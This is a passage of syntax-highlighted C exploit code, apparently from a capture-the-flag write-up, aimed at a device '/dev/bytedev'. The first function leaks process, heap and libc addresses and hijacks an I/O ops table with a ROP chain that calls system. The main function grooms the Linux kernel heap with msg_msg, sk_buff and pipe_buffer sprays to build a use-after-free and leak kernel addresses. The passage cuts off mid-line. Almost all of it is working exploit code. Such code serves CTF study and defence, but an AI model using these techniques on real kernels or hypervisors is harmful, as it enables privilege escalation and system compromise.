<span class="keyword">int</span> fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="keyword">char</span> *fake_ops = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak process base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x114514</span>, <span class="number">1</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-25</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> elf_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x474039</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> system_addr = elf_base + <span class="number">0x2e0250</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_read_addr = elf_base + <span class="number">0x474039</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] process base: \033[0m %p\n&quot;</span>, elf_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] system addr: \033[0m %p\n&quot;</span>, system_addr);</span><br><span class="line"></span><br><span class="line">    read(fd, fake_ops, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak heap base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x186</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> heap_base = *(<span class="keyword">uint64_t</span> *)buf - <span class="number">0x2ae00</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> parent_object = heap_base + <span class="number">0x9f650</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> opaque_addr = heap_base + <span class="number">0x10adc20</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> pmio_ops_addr = opaque_addr + <span class="number">0xb68</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] heap base: \033[0m %p\n&quot;</span>, heap_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] parent_object addr: \033[0m %p\n&quot;</span>, parent_object);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] opaque addr: \033[0m %p\n&quot;</span>, opaque_addr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] leak libc base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-388</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x8</span> * <span class="number">0x8</span>);</span><br><span class="line">    <span class="keyword">uint64_t</span> libc_base = *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x7</span> * <span class="number">8</span>) - <span class="number">0x4385f0</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> mov_rsp_rbx = <span class="number">0x5b4d0</span> + libc_base;</span><br><span class="line">    <span class="comment">// mov rdx, qword ptr [rdi + 8]; mov qword ptr [rsp], rax; call qword ptr [rdx + 0x20];</span></span><br><span class="line">    <span class="keyword">uint64_t</span> magic_gadget = <span class="number">0x0000000000151990</span> + libc_base;</span><br><span class="line">    <span class="keyword">uint64_t</span> pop_rdi = <span class="number">0x0000000000023b6a</span> + libc_base;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] libc base: \033[0m %p\n&quot;</span>, libc_base);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] magic gadget addr: \033[0m %p\n&quot;</span>, magic_gadget);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *command = <span class="string">&quot;nl flag\x00&quot;</span>;</span><br><span class="line">    <span class="keyword">uint64_t</span> command_addr = opaque_addr + <span class="number">0xf8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] prepare for hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810, -0x16d);</span></span><br><span class="line">    <span class="comment">// read(fd, buf, 0x200);</span></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x18</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line"></span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">8</span>) = opaque_addr + <span class="number">0x100</span> - <span class="number">0x20</span>;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe0</span>) = pop_rdi;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xe8</span>) = command_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf0</span>) = system_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0xf8</span>) = *(<span class="keyword">uint64_t</span> *)command;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x100</span>) = mov_rsp_rbx;</span><br><span class="line"></span><br><span class="line">    write(fd, buf, <span class="number">0x108</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-0x16d</span>);</span><br><span class="line"></span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-6</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops) = pmio_read_addr;</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(fake_ops + <span class="number">8</span>) = magic_gadget;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x30</span> + i * <span class="number">8</span>) = *(<span class="keyword">uint64_t</span> *)(fake_ops + i * <span class="number">8</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    write(fd, buf, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] ready to hijack! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] hijake pmio-&gt;ops\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">-347</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0x200</span>);</span><br><span class="line">    *(<span class="keyword">uint64_t</span> *)(buf + <span class="number">0x48</span>) = opaque_addr + <span class="number">0xc28</span>;</span><br><span class="line">    write(fd, buf, <span class="number">0x50</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x1919810</span>, <span class="number">0x196082</span>);</span><br><span class="line">    <span class="comment">// ioctl(fd, 0x1919810,);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] done! \033[0m\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    signal(SIGSEGV, get_shell);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> *buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *point_buf = <span class="built_in">malloc</span>(<span class="number">0x4000</span>);</span><br><span class="line">    <span class="keyword">int</span> victim_qid = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">int</span> sk_sockets[SOCKET_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> msqid[MSG_QUEUE_NUM];</span><br><span class="line">    <span class="keyword">char</span> fake_secondary_msg[<span class="number">704</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> *<span class="title">nearby_msg_prim</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> victim_addr;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> real_qid;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> search_addr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pipe_buf_ptr</span>;</span></span><br><span class="line">    <span class="keyword">int</span> pipe_fd[PIPE_NUM][<span class="number">2</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops_ptr</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *rop_chain = <span class="built_in">malloc</span>(<span class="number">0x2000</span>);</span><br><span class="line">    <span class="keyword">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="number">0</span>, sk_sockets[i]) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to create socket pair!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/dev/bytedev&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;open bytedev failed\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="number">0666</span> | IPC_CREAT)) &lt; <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;failed to create msg_queue!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(<span class="number">0</span>, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray msg_msg, construct overlapping object\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(&amp;primary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(primary_msg));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;secondary_msg, <span class="number">0</span>, <span class="keyword">sizeof</span>(secondary_msg));</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;primary_msg = PRIMARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">long</span> *)&amp;secondary_msg = SECONDARY_MSG_TYPE;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">    *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;primary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;primary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] = MSG_TAG;</span><br><span class="line">        *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] = i;</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(msqid[i], &amp;secondary_msg,</span><br><span class="line">                   <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to send secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="number">1024</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;primary_msg, <span class="keyword">sizeof</span>(primary_msg) - <span class="number">8</span>, PRIMARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive primary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0x84</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    read(fd, buf, <span class="number">0xffc</span>);</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)buf = <span class="number">0xffd</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="number">0xa0</span>, <span class="number">0x1000</span>);</span><br><span class="line">    write(fd, buf, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    victim_qid = real_qid = <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; MSG_QUEUE_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">256</span> == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (msgrcv(msqid[i], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to receive secondary msg!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">0</span>] != MSG_TAG)</span><br><span class="line">        &#123;</span><br><span class="line">            errExit(<span class="string">&quot;failed to make corruption!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>] != i)</span><br><span class="line">        &#123;</span><br><span class="line">            victim_qid = i;</span><br><span class="line">            real_qid = *(<span class="keyword">int</span> *)&amp;secondary_msg.mtext[<span class="number">4</span>];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (victim_qid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to make overlapping!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], buf, <span class="number">0x1000</span> - <span class="number">0x140</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[real_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg) - <span class="number">8</span>, SECONDARY_MSG_TYPE, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to release secondary msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray sk_buff to leak kheap addr\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(fake_secondary_msg, <span class="string">&#x27;Z&#x27;</span>, <span class="keyword">sizeof</span>(fake_secondary_msg));</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="number">0x196082</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg) - <span class="number">8</span>, <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg = (struct msg_msg *)&amp;oob_msg.mtext[(SECONDARY_MSG_SIZE - <span class="keyword">sizeof</span>(struct msg_msg))];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: \033[0m%p\n&quot;</span>,</span><br><span class="line">           nearby_msg-&gt;m_list.prev);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    search_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)nearby_msg-&gt;m_list.prev;</span><br><span class="line">    search_addr = search_addr - <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(oob_msg.mtext, <span class="number">0</span>, <span class="keyword">sizeof</span>(oob_msg.mtext));</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="keyword">sizeof</span>(oob_msg.mtext);</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = search_addr;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;oob_msg, <span class="keyword">sizeof</span>(oob_msg), <span class="number">1</span>, MSG_COPY | IPC_NOWAIT) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*(<span class="keyword">int</span> *)&amp;oob_msg.mtext[<span class="number">0x1000</span>] != MSG_TAG)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to rehit the UAF object!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    nearby_msg_prim = (struct msg_msg *)&amp;oob_msg.mtext[<span class="number">0x1000</span> - <span class="keyword">sizeof</span>(struct msg_msg)];</span><br><span class="line">    victim_addr = (<span class="keyword">unsigned</span> <span class="keyword">long</span> *)(nearby_msg_prim-&gt;m_list.next);</span><br><span class="line">    victim_addr = victim_addr - <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%p\n&quot;</span>, victim_addr);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (read(sk_sockets[i][<span class="number">1</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to release sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n\033[34m\033[1m[*] spray pipe_buffer to leak kernel base\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">704</span> / <span class="number">8</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> *)fake_secondary_msg)[i] = victim_addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.next = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_list.prev = victim_addr + <span class="number">0x200</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_type = VICTIM_MSG_TYPE;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;m_ts = <span class="number">1024</span> - <span class="number">0x30</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    ((struct msg_msg *)fake_secondary_msg)-&gt;security = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; SOCKET_NUM; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; SK_BUFF_NUM; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (write(sk_sockets[i][<span class="number">0</span>], fake_secondary_msg, <span class="keyword">sizeof</span>(fake_secondary_msg)) &lt; <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                errExit(<span class="string">&quot;failed to spray sk_buff!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (msgrcv(msqid[victim_qid], &amp;secondary_msg, <span class="keyword">sizeof</span>(secondary_msg), VICTIM_MSG_TYPE, IPC_NOWAIT | MSG_NOERROR) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        errExit(<span class="string">&quot;failed to read victim msg!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span 